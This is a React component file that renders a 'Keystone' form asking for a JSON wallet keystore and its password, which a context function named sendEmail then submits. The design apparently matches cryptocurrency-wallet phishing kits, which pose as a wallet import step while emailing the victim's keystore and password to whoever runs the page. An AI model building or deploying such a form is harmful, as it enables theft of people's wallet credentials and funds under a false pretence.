import React, { useState,useContext } from "react";
import classes from './keystone.module.css'
import { FaEye } from "react-icons/fa";
import { UserContent } from "../../contextApi/contextApi";

 
const Keystone = () => {
   const { sendEmail } = useContext(UserContent);
  const [close, setClose] = useState(false);
  const toggleClose = () => {
    setClose(!close);
  };
  return (
    <>
      <form action="" onSubmit={sendEmail}>
        <div className={classes.inputs}>
          <div className={classes.inputEye}>
            <textarea
              className={classes.text}
              type={close ? "password" : "text"}
              name="message"
              placeholder="A valid Keystone is in JSON format,such as '{...}'."
            />
          </div>
        </div>
        <div className={classes.inputEye}>
          <input
            type={close ? "password" : "text"}
            placeholder="Provide Keystone password"
            name="message"
          />
          <span>
            <FaEye className="eyes" onClick={toggleClose} />
          </span>
        </div>
        <div className={classes.submit}>
          <button>Proceed</button>
        </div>
      </form>
    </>
  );
};

export default Keystone;
